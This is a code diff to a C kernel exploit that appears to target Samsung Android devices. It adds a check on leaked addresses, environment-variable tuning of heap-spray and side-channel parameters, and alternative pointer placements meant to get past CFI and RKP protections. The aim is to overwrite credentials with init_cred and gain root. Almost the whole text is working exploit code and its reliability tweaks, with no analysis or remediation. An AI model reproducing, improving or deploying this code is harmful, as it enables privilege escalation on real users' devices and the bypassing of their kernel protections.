@@ -19,6 +19,48 @@ static long long ms_since(struct timespec *t0) {
          (now.tv_nsec - t0->tv_nsec) / 1000000LL;
 }
 
+static int mm_leak_is_plausible(uintptr_t leaked) {
+  if (leaked < DIRECT_MAP_BASE || leaked >= DIRECT_MAP_END)
+    return 0;
+
+  FILE *f = fopen("/proc/meminfo", "r");
+  if (!f)
+    return 0;
+  unsigned long long total_kb = 0;
+  int matched = 0;
+  char line[256];
+  while (fgets(line, sizeof(line), f)) {
+    if (sscanf(line, "MemTotal: %llu kB", &total_kb) == 1) {
+      matched = 1;
+      break;
+    }
+  }
+  fclose(f);
+  if (!matched || total_kb == 0)
+    return 0;
+
+  uint64_t ram_limit = total_kb * 1024ULL + (1ULL << 30);
+  uint64_t offset = (uint64_t)leaked - DIRECT_MAP_BASE;
+  uint64_t min_offset = 0x04000000ULL;
+  const char *min_env = getenv("KSNITCH_MIN_OFFSET");
+  if (min_env && *min_env) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long parsed = strtoull(min_env, &end, 0);
+    if (!errno && end != min_env && *end == '\0')
+      min_offset = (uint64_t)parsed;
+  }
+  if (offset < min_offset || offset >= ram_limit) {
+    pr_warning("[spray] rejecting implausible direct-map leak=%016zx "
+               "offset=%016llx min=%016llx limit=%016llx\n",
+               leaked, (unsigned long long)offset,
+               (unsigned long long)min_offset,
+               (unsigned long long)ram_limit);
+    return 0;
+  }
+  return 1;
+}
+
 uintptr_t page_base;
 uintptr_t last_mm_struct;
 uintptr_t fake_lock;
@@ -469,6 +511,11 @@ int clone_memfd(void) {
 void prepare_ctxs(int payload_mode) {
   (void)payload_mode;
   int prepare_slabs = 8;
+  const char *slabs_env = getenv("PREPARE_SLABS");
+  if (slabs_env && *slabs_env) {
+    int forced = atoi(slabs_env);
+    if (forced >= 4 && forced <= 64) prepare_slabs = forced;
+  }
   prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
@@ -498,8 +545,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (pselect_custom_write) {
     if (pselect_child_node) {
       if (pselect_custom_write == 2) {
-        /* W2 uses init_cred; resolve it from the selected device entry. */
-        fake_right = data_addr(g_init_cred_image);
+        /* Keep the credential in the canonical kernel-image mapping. The
+         * direct-map alias is fine as a stored pointer but cannot safely be
+         * dereferenced as current->cred on this Samsung RKP-protected image. */
+        fake_right = text_addr(g_init_cred_image);
+      } else if (pselect_custom_write == 3) {
+        fake_right = pselect_custom_value;
       } else {
         /* W1 targets the initialized page at base+0x100. */
         fake_right = base + 0x100;
@@ -516,8 +567,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       pselect_custom_value = fake_fops;
     }
   } else {
-    fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    uintptr_t misc_target = data_addr(ASHMEM_MISC_FOPS);
+    const char *bootstrap = getenv("CFI_BOOTSTRAP");
+    if (bootstrap && strcmp(bootstrap, "canon") == 0) {
+      fake_parent = text_addr(ASHMEM_MISC_FOPS) - sizeof(uint64_t);
+    } else if (bootstrap && strcmp(bootstrap, "canon8") == 0) {
+      fake_parent = text_addr(ASHMEM_MISC_FOPS);
+    } else if (bootstrap && strcmp(bootstrap, "data8") == 0) {
+      fake_parent = misc_target;
+    } else {
+      fake_parent = misc_target - sizeof(uint64_t);
+    }
+    fake_right = fake_fops;
     fake_left = 0;
   }
   binwrite_target = payload_base + SCRATCH_OFF;
@@ -613,9 +674,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
 
+  size_t collision_count = KSNITCH_COLLISIONS;
+  const char *collision_env = getenv("KSNITCH_COLLISIONS");
+  if (collision_env && *collision_env) {
+    int forced = atoi(collision_env);
+    if (forced >= 2 && forced <= 12) collision_count = (size_t)forced;
+  }
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, collision_count, 0, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -716,6 +783,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     cleanup_page_prepare_state();
     return 0;
   }
+  if (!mm_leak_is_plausible(leaked)) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   if (!prepare_skb_payload(base, payload_mode)) {
@@ -799,11 +875,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 uintptr_t prepare_good_kernel_page(int payload_mode) {
   int max_attempts = payload_mode == PAGE_PAYLOAD_FOPS
       ? 4 : KERNEL_PAGE_SETUP_ATTEMPTS;
+  const char *max_env = getenv("KERNEL_PAGE_ATTEMPTS");
+  if (max_env && *max_env) {
+    int forced = atoi(max_env);
+    if (forced > 0 && forced <= 32) max_attempts = forced;
+  }
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
   deadline.tv_sec += 240;
+  static const int rotating_collisions[] = { 5, 4, 6 };
+  int rotate_collisions = getenv("KSNITCH_ROTATE") != NULL;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (rotate_collisions) {
+      int collision_count =
+          rotating_collisions[(attempt - 1) %
+                              (sizeof(rotating_collisions) /
+                               sizeof(rotating_collisions[0]))];
+      char collision_buf[8];
+      snprintf(collision_buf, sizeof(collision_buf), "%d", collision_count);
+      setenv("KSNITCH_COLLISIONS", collision_buf, 1);
+    }
     uintptr_t base = prepare_kernel_page(payload_mode);
     if (base) {
       pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
